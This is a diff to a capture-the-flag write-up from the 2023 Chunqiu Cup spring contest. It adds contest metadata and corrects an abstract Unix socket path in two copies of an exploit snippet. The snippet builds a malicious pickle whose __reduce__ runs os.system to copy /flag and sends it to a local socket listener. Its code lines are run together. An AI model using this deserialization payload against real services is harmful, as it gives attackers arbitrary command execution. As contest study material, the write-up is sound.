@@ -75,6 +75,9 @@ prerequisites:
 - Python pickle opcode 手搓
 - SSTI 模板注入
 - PyInstaller 解包与反编译
+contest_normalized: "春秋杯"
+contest_year: 2023
+subcategory_guess: "ssti"
 ---
 # 2023年春秋杯春季赛-WriteUp By EDISEC
 
@@ -179,7 +182,7 @@ import socketimport pickleimport osimport array
 class Person(): def __reduce__(self): command=r"cat /flag>/tmp/pwned" return (os.system,(command,))
 p=Person()opcode=pickle.dumps(p)print(opcode)f = open("exp.data","wb")f.write(opcode)f.close()
 # 定义抽象命名空间套接字路径 没ss
-# socket_path = " "+os.popen("ss -lx | grep '@'|awk '{print $5}'").read().replace("@","").strip()socket_path = " listener-51-0"print(socket_path)def sendfds(sock, fds): '''Send an array of fds over an AF_UNIX socket.'''
+# socket_path = "\\x00"+os.popen("ss -lx | grep '@'|awk '{print $5}'").read().replace("@","").strip()socket_path = "\\x00listener-51-0"print(socket_path)def sendfds(sock, fds): '''Send an array of fds over an AF_UNIX socket.'''
 # 创建套接字sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
 # 连接到服务器sock.connect(socket_path)
 # 准备发送的数据data = opcode
@@ -644,7 +647,7 @@ import socketimport pickleimport osimport array
 class Person(): def __reduce__(self): command=r"cat /flag>/tmp/pwned" return (os.system,(command,))
 p=Person()opcode=pickle.dumps(p)print(opcode)f = open("exp.data","wb")f.write(opcode)f.close()
 # 定义抽象命名空间套接字路径 没ss
-# socket_path = " "+os.popen("ss -lx | grep '@'|awk '{print $5}'").read().replace("@","").strip()socket_path = " listener-51-0"print(socket_path)def sendfds(sock, fds): '''Send an array of fds over an AF_UNIX socket.'''
+# socket_path = "\\x00"+os.popen("ss -lx | grep '@'|awk '{print $5}'").read().replace("@","").strip()socket_path = "\\x00listener-51-0"print(socket_path)def sendfds(sock, fds): '''Send an array of fds over an AF_UNIX socket.'''
 # 创建套接字sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
 # 连接到服务器sock.connect(socket_path)
 # 准备发送的数据data = opcode
